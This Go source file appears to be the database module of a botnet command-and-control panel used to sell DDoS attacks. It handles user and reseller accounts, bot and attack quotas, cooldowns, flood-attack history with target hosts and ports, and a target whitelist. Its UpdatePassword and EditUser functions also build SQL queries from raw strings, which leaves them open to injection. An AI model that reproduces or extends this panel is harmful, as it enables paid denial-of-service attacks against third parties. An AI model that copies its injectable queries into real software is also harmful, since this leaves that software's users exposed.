package main

import (
	"database/sql"
	"encoding/binary"
	"errors"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"golang.org/x/crypto/bcrypt"
	"log"
	"net"
	"strings"
	"time"
)

type Database struct {
	db *sql.DB
}

type AccountInfo struct {
	ID           int
	Username     string
	Bots         int
	Admin        bool
	Reseller     bool
	MaxAttacks   int
	TotalAttacks int
	Expiry       time.Time
	CreatedBy    string
}

type User struct {
	ID            int
	Username      string
	Password      string
	DurationLimit int
	Cooldown      int
	MaxBots       int
	MaxAttacks    int
	TotalAttacks  int
	Expiry        sql.NullInt64
	Admin         bool
	Reseller      bool
	CreatedBy     string
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
	if err != nil {
		log.Printf(LogError + fmt.Sprintf("%s", err))
	}

	log.Printf(LogInfo + "Database connection initiated.")
	return &Database{db}
}

func (d *Database) TryLogin(username string, password string, ip string) (bool, AccountInfo, error) {
	row := d.db.QueryRow("SELECT id, username, password, max_bots, admin, reseller, max_attacks, total_attacks, expiry, created_by FROM users WHERE username = ?", username)

	var accInfo AccountInfo
	var hashedPassword string
	var timestamp int64
	var adminInt, resellerInt int

	err := row.Scan(&accInfo.ID, &accInfo.Username, &hashedPassword, &accInfo.Bots, &adminInt, &resellerInt, &accInfo.MaxAttacks, &accInfo.TotalAttacks, &timestamp, &accInfo.CreatedBy)
	if err != nil {
		if err == sql.ErrNoRows {
			return false, AccountInfo{}, fmt.Errorf("%s attempted to login to %s, but it's invalid.\r\n", ip, username)
		} else {
			fmt.Println(err)
			return false, AccountInfo{}, err
		}
	}

	if err := bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(password)); err != nil {
		fmt.Printf("Login error: %s\r\n", err)
		return false, AccountInfo{}, err
	}

	accInfo.Admin = adminInt == 1
	accInfo.Reseller = resellerInt == 1
	accInfo.Expiry = time.Unix(timestamp, 0)
	return true, accInfo, nil
}

func (d *Database) CreateUser(username string, password string, max_bots int, userMaxAttacks int, duration int, cooldown int, expiry int64, isAdmin bool, isReseller bool, createdBy string) bool {
	// hash the password
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		fmt.Println(err)
		return false
	}

	// insert into the database
	_, err = d.db.Exec(
		"INSERT INTO users (username, password, duration_limit, cooldown, max_bots, max_attacks, expiry, admin, reseller, created_by) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
		username,
		hashedPassword,
		duration,
		cooldown,
		max_bots,
		userMaxAttacks,
		expiry,
		isAdmin,
		isReseller,
		createdBy,
	)
	if err != nil {
		fmt.Println(err)
		return false
	}

	return true
}
func (d *Database) GetUsersCreatedBy(resellerUsername string) ([]User, error) {
	query := "SELECT * FROM users WHERE created_by = ?"

	rows, err := d.db.Query(query, resellerUsername)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	users := []User{}
	for rows.Next() {
		var user User
		if err := rows.Scan(&user.ID, &user.Username, &user.Password, &user.DurationLimit, &user.Cooldown, &user.Expiry, &user.MaxBots, &user.MaxAttacks, &user.TotalAttacks, &user.Admin, &user.Reseller, &user.CreatedBy); err != nil {
			return nil, err
		}
		users = append(users, user)
	}
	return users, nil
}

func (d *Database) GetUsers() ([]User, error) {
	rows, err := d.db.Query("SELECT * FROM users")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	users := []User{}
	for rows.Next() {
		var user User
		if err := rows.Scan(&user.ID, &user.Username, &user.Password, &user.DurationLimit, &user.Cooldown, &user.Expiry, &user.MaxBots, &user.MaxAttacks, &user.TotalAttacks, &user.Admin, &user.Reseller, &user.CreatedBy); err != nil {
			return nil, err
		}
		users = append(users, user)
	}
	return users, nil
}

func (d *Database) EditUser(username string, field string, newValue interface{}) error {
	// Convert newValue to appropriate type based on field
	var value interface{}
	var err error

	switch v := newValue.(type) {
	case int:
		value = v
	case int64: // Add this case to handle int64 values (Unix timestamps)
		value = v
	case bool:
		value = v
	case string:
		if field == "password" {
			value, err = bcrypt.GenerateFromPassword([]byte(v), bcrypt.DefaultCost)
			if err != nil {
				return fmt.Errorf("bcrypt error: %v", err)
			}
		} else {
			value = v
		}
	default:
		return fmt.Errorf("unsupported field type")
	}

	query := fmt.Sprintf("UPDATE users SET %s = ? WHERE username = ?", field)

	// Print query for debugging
	fmt.Println("Executing query:", query, "with values:", value, username)

	result, err := d.db.Exec(query, value, username)
	if err != nil {
		return fmt.Errorf("exec error: %v", err)
	}

	rowsAffected, err := result.RowsAffected()
	if err != nil {
		return fmt.Errorf("rows affected error: %v", err)
	} else if rowsAffected == 0 {
		fmt.Println("No rows were affected by the update query")
	}

	return nil
}

func (d *Database) RemoveUser(username string) error {
	var userID int
	err := d.db.QueryRow("SELECT id FROM users WHERE username = ?", username).Scan(&userID)
	if err != nil {
		return err
	}

	_, err = d.db.Exec("DELETE FROM history WHERE user_id = ?", userID)
	if err != nil {
		return err
	}

	_, err = d.db.Exec("DELETE FROM users WHERE id = ?", userID)
	if err != nil {
		return err
	}

	return nil
}

func (d *Database) CheckUserCreatedBy(username string, reseller string) bool {
	var createdBy string
	err := d.db.QueryRow("SELECT created_by FROM users WHERE username = ?", username).Scan(&createdBy)
	if err != nil {
		fmt.Println(err)
		return false
	}
	return createdBy == reseller
}

func (d *Database) CheckUserPassword(username string, enteredPassword string) bool {
	var dbPassword string
	err := d.db.QueryRow("SELECT password FROM users WHERE username = ?", username).Scan(&dbPassword)
	if err != nil {
		fmt.Println(err)
		return false
	}

	err = bcrypt.CompareHashAndPassword([]byte(dbPassword), []byte(enteredPassword))
	if err != nil {
		return false
	}

	return true
}

func (d *Database) CountNonAdminUsers() (int, error) {
	var count int
	currentTime := time.Now().Unix()
	err := d.db.QueryRow("SELECT COUNT(*) FROM users WHERE admin != 1 AND (expiry IS NULL OR expiry <= ?)", currentTime).Scan(&count)
	if err != nil {
		fmt.Println(err)
		return 0, err
	}
	return count, nil
}

func (d *Database) UpdatePassword(username string, newPassword string) error {
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(newPassword), bcrypt.DefaultCost)
	if err != nil {
		fmt.Println("Error hashing password:", err)
		return err
	}

	// Prepare the query.
	query := fmt.Sprintf("UPDATE users SET password = '%s' WHERE username = '%s'", string(hashedPassword), username)
	fmt.Println("Executing query:", query)

	result, err := d.db.Exec(query)
	if err != nil {
		fmt.Println("Error executing query:", err)
		return err
	}

	rowsAffected, err := result.RowsAffected()
	if err != nil {
		fmt.Println("Error getting rows affected:", err)
		return err
	}

	if rowsAffected == 0 {
		err = fmt.Errorf("No user found with username: %s", username)
		fmt.Println(err)
		return err
	}

	return nil
}

func (d *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	rows, err := d.db.Query("SELECT prefix, netmask FROM whitelist")
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()
	for rows.Next() {
		var prefix string
		var netmask uint8
		rows.Scan(&prefix, &netmask)

		// Parse prefix
		ip := net.ParseIP(prefix)
		ip = ip[12:]
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)

		for aPNetworkOrder, aN := range attack.Targets {
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
			if aN > netmask { // Whitelist is less specific than attack target
				if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
					return true
				}
			} else if aN < netmask { // Attack target is less specific than whitelist
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
			} else { // Both target and whitelist have same prefix
				if iWhitelistPrefix == iAttackPrefix {
					return true
				}
			}
		}
	}
	return false
}

func (d *Database) getOngoingAttacks() ([]map[string]string, error) {
	currentUnixTime := time.Now().Unix()

	rows, err := d.db.Query(
		`SELECT users.username, history.time_sent, history.duration, history.command
        FROM history
        JOIN users ON history.user_id = users.id
        WHERE history.duration + history.time_sent > ?`, currentUnixTime)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var attacks []map[string]string

	for rows.Next() {
		var username string
		var timeSent, duration int
		var command string

		err := rows.Scan(&username, &timeSent, &duration, &command)
		if err != nil {
			return nil, err
		}
		commandParts := strings.Split(command, " ")

		if len(commandParts) < 3 {
			continue
		}

		var port string
		if len(commandParts) > 3 && strings.HasPrefix(commandParts[3], "port=") {
			port = strings.TrimPrefix(commandParts[3], "port=")
		}
		var length string
		if len(commandParts) > 3 && strings.HasPrefix(commandParts[3], "size=") {
			length = strings.TrimPrefix(commandParts[3], "size=")
		}

		elapsedTime := currentUnixTime - int64(timeSent)
		remainingTime := int64(duration) - elapsedTime

		attack := map[string]string{
			"username":  username,
			"host":      commandParts[1],
			"port":      port,
			"size":      length,
			"duration":  fmt.Sprintf("%d", duration),
			"floodType": strings.TrimPrefix(commandParts[0], "!"),
			"started":   fmt.Sprintf("%d seconds ago", elapsedTime),
			"ended":     fmt.Sprintf("in %d seconds", remainingTime),
		}

		attacks = append(attacks, attack)
	}

	return attacks, nil
}

func (d *Database) getAllAttacks() ([]map[string]string, error) {
	rows, err := d.db.Query(
		`SELECT users.username, history.time_sent, history.duration, history.command
FROM history
JOIN users ON history.user_id = users.id`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var attacks []map[string]string

	for rows.Next() {
		var username string
		var timeSent, duration int
		var command string

		err := rows.Scan(&username, &timeSent, &duration, &command)
		if err != nil {
			return nil, err
		}
		commandParts := strings.Split(command, " ")

		var port string
		if len(commandParts) > 3 && strings.HasPrefix(commandParts[3], "dport=") {
			port = strings.TrimPrefix(commandParts[3], "dport=")
		}

		attack := map[string]string{
			"username":  username,
			"host":      commandParts[1],
			"port":      port,
			"duration":  fmt.Sprintf("%d", duration),
			"floodType": strings.TrimPrefix(commandParts[0], "!"),
			"time":      time.Unix(int64(timeSent), 0).Format("Mon Jan 2 15:04:05 MST 2006"),
		}

		attacks = append(attacks, attack)
	}

	return attacks, nil
}

func (d *Database) runningatk() int {
	var count int
	row := d.db.QueryRow("SELECT COUNT(*) FROM `history` WHERE  `duration` + `time_sent` > UNIX_TIMESTAMP()")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (d *Database) ClearAttacks() error {
	_, err := d.db.Exec("UPDATE users SET TotalAttacks = 0")
	return err
}

func (d *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	rows, err := d.db.Query("SELECT id, duration_limit, cooldown, max_attacks, total_attacks FROM users WHERE username = ?", username)
	defer func(rows *sql.Rows) {
		err := rows.Close()
		if err != nil {

		}
	}(rows)
	if err != nil {
		fmt.Println(err)
	}
	var userId, durationLimit, cooldown, UserMaxAttacks, TotalAttacks uint32
	if !rows.Next() {
		return false, errors.New("Your access has been terminated")
	}
	rows.Scan(&userId, &durationLimit, &cooldown, &UserMaxAttacks, &TotalAttacks)

	if int(UserMaxAttacks) != 9999 && TotalAttacks >= UserMaxAttacks {
		return false, errors.New("max attacks reached. you cannot launch more attacks")
	}

	if durationLimit != 0 && duration > durationLimit {
		return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
	}
	rows.Close()

	if allowConcurrent == 0 {
		rows, err = d.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
		if err != nil {
			fmt.Println(err)
		}
		if rows.Next() {
			var timeSent, historyDuration uint32
			rows.Scan(&timeSent, &historyDuration)
			return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}

	d.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
	return true, nil
}

func (d *Database) black(duration uint32, fullCommand string, maxBots int) error {
	var userId uint32

	_, err := d.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
	if err != nil {
		return err
	}

	return nil
}

func (d *Database) GetTotalAttacksForUser(userID int) (int, error) {
	var totalAttacks int
	err := d.db.QueryRow("SELECT total_attacks FROM users WHERE id = ?", userID).Scan(&totalAttacks)
	if err != nil {
		return 0, err
	}
	return totalAttacks, nil
}

func (d *Database) IncreaseTotalAttacks(username string) error {
	_, err := d.db.Exec("UPDATE users SET total_attacks = total_attacks + 1 WHERE username = ?", username)
	return err
}

func (d *Database) UpdateMaxAttacks(username string, amount int) error {
	_, err := d.db.Exec("UPDATE users SET max_attacks = ? WHERE username = ?", amount, username)
	return err
}
